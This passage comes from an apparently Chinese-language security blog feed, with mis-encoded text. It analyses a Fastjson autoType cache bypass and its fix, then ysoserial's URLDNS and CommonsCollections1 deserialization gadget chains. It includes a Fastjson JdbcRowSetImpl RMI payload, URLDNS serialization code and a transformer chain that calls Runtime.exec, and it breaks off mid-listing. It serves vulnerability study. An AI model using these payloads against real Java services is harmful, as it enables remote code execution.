class="keyword">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ <code>mappings.put(className, clazz)</code>, å¦‚æœè¿™ä¸ªç±»å­˜åœ¨, ä¼šå°†å…¶æ”¾å…¥ TypeUtils é‡Œé¢çš„è¿™ä¸ªç¼“å­˜ä¸­.  </p><p>åˆå›åˆ° checkAutoType ä¸­, æ³¨æ„è¿™ä¸ª</p><p>com.alibaba.fastjson.parser.ParserConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.alibaba.fastjson.util.TypeUtils</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™¤äº†åœ¨ deserializers é‡Œé¢å¯»æ‰¾, è¿˜ä¼šåœ¨ TypeUtils çš„ç¼“å­˜é‡Œé¢å¯»æ‰¾, è€Œåˆšåˆšæˆ‘ä»¬é€šè¿‡ Class çš„ååºåˆ—åŒ–æ–¹æ³•, å°†æˆ‘ä»¬æƒ³è¦çš„ç±»æ”¾å…¥äº†ç¼“å­˜ä¸­. è¿™å°±åˆ°è¾¾äº†ç»•è¿‡çš„æ•ˆæœ, æ„å‘³ç€å°±ç®—æˆ‘ä»¬å…³é—­äº† autoType, ç…§æ ·å¯ä»¥è¿›è¡Œåˆ©ç”¨, æ¼æ´çš„å‘ç°è€… tql.  </p><p>è¿™é‡Œçš„æœ¬æ„, åº”è¯¥æ˜¯åŠ å¿«é€Ÿåº¦, æ¯•ç«Ÿå¦‚æœä½ ä¹‹å‰åŠ è½½è¿‡è¿™ä¸ªç±», å½“ç„¶æ˜¯åœ¨ç™½åå•é‡Œé¢çš„, ä½†æ˜¯é—®é¢˜å‡ºç°åœ¨ Class çš„ååºåˆ—å™¨ä¹Ÿä¼šè°ƒç”¨ loadClass, è¿™æ˜¯å¼€å‘è€…å¿˜è®°æ‰çš„. å¯¼è‡´æ¶æ„ç±»è¢«æ”¾å…¥äº†ç¼“å­˜ä¸­, ç»•è¿‡äº†æ£€æµ‹.  </p><h2 id="1-2-48-ä¿®å¤"><a href="#1-2-48-ä¿®å¤" class="headerlink" title="1.2.48 ä¿®å¤"></a>1.2.48 ä¿®å¤</h2><p>å¯¹åº”çš„ä¿®å¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°† loadClass çš„ cache è®¾ä¸º false, è¿™æ ·ååºåˆ— Class å¯¹è±¡çš„æ—¶å€™, å°±ä¸ä¼šå°†ç»“æœæ”¾å…¥ç¼“å­˜ä¸­, è‡ªç„¶ä¹Ÿå°±æ— æ³•ç»•è¿‡ checkAutoType äº†.</p><h2 id="æœ¬æ–‡å‚è€ƒ-æ¨èé˜…è¯»"><a href="#æœ¬æ–‡å‚è€ƒ-æ¨èé˜…è¯»" class="headerlink" title="æœ¬æ–‡å‚è€ƒ/æ¨èé˜…è¯»"></a>æœ¬æ–‡å‚è€ƒ/æ¨èé˜…è¯»</h2><p>[1] <a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a><br>[2] <a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a><br>[3] <a href="https://kingx.me/Details-in-FastJson-RCE.html" target="_blank" rel="noopener">https://kingx.me/Details-in-FastJson-RCE.html</a><br>[4] <a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h2&gt;&lt;p&gt;å…ˆçœ‹ç»å…¸ payload&lt;/p&gt;
&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;attr&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;com.sun.rowset.JdbcRowSetImpl&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;dataSourceName&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;rmi://localhost:1099/Exploit&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;autoCommit&quot;&lt;/span&gt;:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial URLDNS, CommonsCollectionsX åˆ†æ</title>
    <link href="https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/"/>
    <id>https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/</id>
    <published>2020-01-20T09:45:51.000Z</published>
    <updated>2020-02-04T16:01:44.650Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰éƒ½æ˜¯ ysoserial ä¸€æŠŠæ¢­, è¿˜æ˜¯å¾—å­¦ä¹  + å¤ç°ä¸€ä¸‹å†…éƒ¨å®ç°æœºåˆ¶çš„.</p><a id="more"></a><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>æœ€ç®€å•çš„ä¸€ä¸ª, è¿™ä¸ªæˆå› å°±æ˜¯ <code>java.util.HashMap</code> é‡å†™äº† <code>readObject</code>, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <code>hash</code> å‡½æ•°è®¡ç®— key çš„ hashCode.</p><p><img src="https://i.loli.net/2020/01/20/onW3ErpxJT2mK1z.png" alt=""><br><img src="https://i.loli.net/2020/01/20/xJrPjCgF5eh1Kfs.png" alt=""></p><p>è€Œ <code>java.net.URL</code> çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ <code>getHostAddress</code> æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚.</p><p><img src="https://i.loli.net/2020/01/20/tzER6LIsc125OU7.png" alt=""><br><img src="https://i.loli.net/2020/01/20/53j1fLybKRUHsYV.png" alt="">  </p><p>å¯ä»¥ç†è§£ä¸º, åœ¨åºåˆ—åŒ– HashMap ç±»çš„å¯¹è±¡æ—¶, ä¸ºäº†å‡å°åºåˆ—åŒ–åçš„å¤§å°, å¹¶æ²¡æœ‰å°†æ•´ä¸ªå“ˆå¸Œè¡¨ä¿å­˜è¿›å», è€Œæ˜¯ä»…ä»…ä¿å­˜äº†æ‰€æœ‰å†…éƒ¨å­˜å‚¨çš„ key å’Œ value. æ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶, éœ€è¦é‡æ–°è®¡ç®—æ‰€æœ‰ key çš„ hash, ç„¶åä¸ value ä¸€èµ·æ”¾å…¥å“ˆå¸Œè¡¨ä¸­. è€Œæ°å¥½, URL è¿™ä¸ªå¯¹è±¡è®¡ç®— hash çš„è¿‡ç¨‹ä¸­ç”¨äº† getHostAddress æŸ¥è¯¢äº† URL çš„ä¸»æœºåœ°å€, è‡ªç„¶éœ€è¦å‘å‡º DNS è¯·æ±‚.</p><p>æ•´æ¡è°ƒç”¨é“¾å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br></pre></td></tr></table></figure><p>URLDNS.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxxx.xxx.xxx"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); <span class="comment">// è®¾ä¸€ä¸ªå€¼, è¿™æ · put çš„æ—¶å€™å°±ä¸ä¼šå»æŸ¥è¯¢ DNS</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>); <span class="comment">// hashCode è¿™ä¸ªå±æ€§ä¸æ˜¯ transient çš„, æ‰€ä»¥æ”¾è¿›å»åè®¾å› -1, è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šé‡æ–°è®¡ç®— hashCode</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><p>è¿™ä¸ªåˆ©ç”¨é“¾æ¯”è¾ƒå¤æ‚, å€Ÿ ysoserial è‡ªå¸¦çš„è°ƒç”¨æ ˆå…ˆçœ‹çœ‹å§,  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ç‰ˆæœ¬å—é™, å…ˆçœ‹ ysoserial è‡ªå¸¦çš„ç‰ˆæœ¬æ£€æµ‹ (å•å…ƒæµ‹è¯•çš„æ—¶å€™ç”¨çš„),  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isAnnInvHUniversalMethodImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    JavaVersion v = JavaVersion.getLocalVersion();</span><br><span class="line">    <span class="keyword">return</span> v != <span class="keyword">null</span> &amp;&amp; (v.major &lt; <span class="number">8</span> || (v.major == <span class="number">8</span> &amp;&amp; v.update &lt;= <span class="number">71</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äº²æµ‹ u71 å®é™…å·²ç»ä¿®å¤äº† <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ä¸­çš„æ¼æ´, æ‰€ä»¥å®é™…ä¸Š ysoseiral æ£€æµ‹çš„æ˜¯æœ‰é—®é¢˜çš„â€¦  </p><p>åº”è¯¥æ˜¯ <code>v.update &lt; 71</code> æ‰å¯¹. åœ¨ <code>https://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html</code> å¯ä»¥ä¸‹åˆ°è€ç‰ˆ jdk.<br>ä»¥ä¸‹ä»£ç å‡ä»¥å°äº u71 çš„èƒ½ä¸‹åˆ°çš„æœ€æ–°ç‰ˆæœ¬ u66 ä¸ºä¾‹å­.</p><p>è¿™ä¸ªé“¾ç›¸å¯¹æ¯”è¾ƒå¤æ‚, æ‰€ä»¥å€’ç€æ¥, ä» <code>LazyMap.get()</code> å¼€å§‹. </p><p>org.apache.commons.collections.map.LazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ get è¿™ä¸ª map æ—¶, å¦‚æœå†…éƒ¨çš„ map ä¸å­˜åœ¨è¿™ä¸ª key, å°†ä¼šè°ƒç”¨ <code>this.factory.transform(key)</code>, å°†ç»“æœä½œä¸ºè¿”å›å€¼. å†æ¥çœ‹å±æ€§å®šä¹‰  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure><p>è€Œ Transformer æ˜¯ä¸€ä¸ªåŸºç±», ChainedTransformer, ConstantTransformer, InvokerTransformer å‡ç»§æ‰¿äºæ­¤çˆ¶ç±». æ¥ä¸‹æ¥çœ‹å¦‚æœé€šè¿‡ <code>this.factory.transform(key)</code> è¾¾åˆ° RCE çš„æ•ˆæœ.  </p><p>org.apache.commons.collections.functors.ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ChainedTransformer çš„ä½œç”¨æ˜¯å°†å†…éƒ¨çš„ iTransformers æŒ‰é¡ºåºéƒ½è°ƒç”¨ä¸€é. </p><p>org.apache.commons.collections.functors.ConstantTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer çš„ä½œç”¨æ˜¯ä¸ç®¡è¾“å…¥, ç›´æ¥è¿”å›ä¸€ä¸ªå¸¸é‡.</p><p>æœ€åæ˜¯é‡ç‚¹ org.apache.commons.collections.functors.InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçš„ä½œç”¨æ˜¯è°ƒç”¨è¾“å…¥å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•, å¹¶ä¸”å‚æ•°å¯æ§, è¿™å°±éå¸¸ç‰›é€¼äº†, å°†è¿™äº›ç»“åˆèµ·æ¥, å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/rmb122_pwned"</span>&#125;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>è¿™æ—¶è°ƒç”¨ <code>chainedTransformer.transform</code>, ç­‰ä»·äº <code>java.lang.Runtime.getRuntime().exec(new String[]{&quot;/bin/touch&quot;, &quot;/dev/shm/rmb122_pwned&quot;})</code>,<br>å°† chainedTransformer ä½œä¸º <code>Lazymap</code> çš„ <code>factory</code>, å† get ä¸€ä¸ªä¸å­˜åœ¨çš„ key, å°±èƒ½è¾¾åˆ° RCE çš„ç›®çš„.</p><p>é—®é¢˜å°±æ˜¯ç°åœ¨ç¼ºå°‘ä¸€ä¸ªåœ¨ readObject æ—¶ get çš„å¯¹è±¡, è€Œä¸”æœ€å¥½æ˜¯ jre å†…ç½®çš„. è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ä½œè€…çš„ç‰›é€¼ä¹‹å¤„, æ¯•ç«Ÿè¿™äº›ç±»å¯ä¸æ˜¯éšä¾¿æ‰¾æ‰¾å°±èƒ½æ‰¾åˆ°çš„.  </p><p>è¿™é‡Œçœ‹ <code>sun.reflect.annotation.AnnotationInvocationHandler</code> è¿™ä¸ªç±»çš„ <code>invoke</code> æ–¹æ³•,  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 